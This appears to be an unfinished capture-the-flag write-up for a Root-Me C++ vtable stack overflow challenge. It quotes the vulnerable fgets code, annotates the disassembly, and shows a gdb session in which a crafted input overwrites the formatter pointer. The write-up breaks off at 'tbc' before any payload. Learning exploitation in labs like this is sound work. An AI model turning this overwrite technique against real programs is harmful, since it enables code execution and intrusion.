# ELF x86 - Stack buffer overflow - C++ vtables
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-C-vtables
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         Yes 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch20@challenge02.root-me.org    
Username	app-systeme-ch20
Password	app-systeme-ch20
```
First, let's identify the vulnerability. It presents in the **GetInput** function:
```c++
[... snip ...]
#define SIZE (80)
[... snip ...]
    void GetInput(int padding )  {
        memset(str ,' ' , SIZE  ); 
        fgets(str+padding,SIZE,stdin); 
    }
[... snip ...]
    char str[SIZE];
    formatter * m_pFormatter
[... snip ...]
```
The _str_ variable is a 80 byte long buffer. In the **GetInput** function, the **fgets** gets 80 bytes from the user. 
But, it won't put it at the start of the buffer. It would put it in an offset, according the given _padding_ variable.<br>
According to the program's flow, the _padding_ value can be 1-5:
```c++
printf("Padding : 1-5\r\n");
char size[4];
int padding  = atoi(fgets(size,4,stdin));
if (padding <0 || padding >5)
{
    printf ("Padding error\r\n");
    exit(0);
}
```
It's possible to overwrite 1-5 bytes after the **str** buffer.<br>
According to the title, in order to exploit the binary, we should overwrite a _VPTR_. Because the **display** function is called, and uses the **format** function, Let's analyze it:
```asm
   0x08048a02 <+0>:	push   ebp
   0x08048a03 <+1>:	mov    ebp,esp
   
   0x08048a05 <+3>:	sub    esp,0x18                     ; reserve 24 bytes in stack
   0x08048a08 <+6>:	mov    eax,DWORD PTR [ebp+0x8]      ; gets the str address
   0x08048a0b <+9>:	mov    eax,DWORD PTR [eax+0x50]     ; gets the end of str buffer (should be the formatter's address)
   0x08048a0e <+12>:	mov    eax,DWORD PTR [eax]          ; gets the data of the formatter
   0x08048a10 <+14>:	add    eax,0x8                      ; gets the formatter's format function
   0x08048a13 <+17>:	mov    ecx,DWORD PTR [eax]          ; stores the format function, for calling at 0x08048a25
   
   0x08048a15 <+19>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048a18 <+22>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048a1b <+25>:	mov    eax,DWORD PTR [eax+0x50]
   0x08048a1e <+28>:	mov    DWORD PTR [esp+0x4],edx
   0x08048a22 <+32>:	mov    DWORD PTR [esp],eax
   
   0x08048a25 <+35>:	call   ecx                          ; calling the format function
   0x08048a27 <+37>:	leave  
   0x08048a28 <+38>:	ret    
```
So basically, because the **format** function is right after the _str_ buffer, one can overwrite it with his own address (reminder - the vulnerability enables writing up to 5 bytes).
Let's verify it:
```gdb
(gdb) run < <(python -c "print '5\n1\n' + 'A'*75 + 'DDDD'")
Starting program: /challenge/app-systeme/ch20/ch20 < <(python -c "print '5\n1\n' + 'A'*75 + 'DDDD'")
Padding : 1-5


	Convert in : 
	  1: uppercase  
	  2: lowercase  
String to convert: 

Program received signal SIGSEGV, Segmentation fault.
0x08048a0e in MyStringFormatter::display() const ()
(gdb) info registers
eax            0x44444444	1145324612
ecx            0xbffffb15	-1073743083
edx            0xb7ee98a4	-1209100124
ebx            0x804b008	134524936
esp            0xbffffac0	0xbffffac0
ebp            0xbffffad8	0xbffffad8
esi            0x0	0
edi            0x0	0
eip            0x8048a0e	0x8048a0e <MyStringFormatter::display() const+12>
eflags         0x10286	[ PF SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) disass _ZNK17MyStringFormatter7displayEv
Dump of assembler code for function _ZNK17MyStringFormatter7displayEv:
   0x08048a02 <+0>:	push   %ebp
   0x08048a03 <+1>:	mov    %esp,%ebp
   0x08048a05 <+3>:	sub    $0x18,%esp
   0x08048a08 <+6>:	mov    0x8(%ebp),%eax
   0x08048a0b <+9>:	mov    0x50(%eax),%eax
=> 0x08048a0e <+12>:	mov    (%eax),%eax
   0x08048a10 <+14>:	add    $0x8,%eax
   0x08048a13 <+17>:	mov    (%eax),%ecx
   0x08048a15 <+19>:	mov    0x8(%ebp),%edx
   0x08048a18 <+22>:	mov    0x8(%ebp),%eax
   0x08048a1b <+25>:	mov    0x50(%eax),%eax
   0x08048a1e <+28>:	mov    %edx,0x4(%esp)
   0x08048a22 <+32>:	mov    %eax,(%esp)
   0x08048a25 <+35>:	call   *%ecx
   0x08048a27 <+37>:	leave  
   0x08048a28 <+38>:	ret    
End of assembler dump.
```
As you may see, the _eax_ is set to 0x44444444 and therefore the segfault. You may also see that the next 2 instructions will set _ecx_ to _eax_ as expected.<br>
Now that we (probably) can control the _eip_, let's do the basic stack exploitation (no ASLR nor NX).<br>
Let's look again at the assembly of the **display** function:
```asm
   0x08048a08 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048a0b <+9>:	mov    eax,DWORD PTR [eax+0x50]
   0x08048a0e <+12>:	mov    eax,DWORD PTR [eax]
   0x08048a10 <+14>:	add    eax,0x8
   0x08048a13 <+17>:	mov    ecx,DWORD PTR [eax]
```
[tbc]
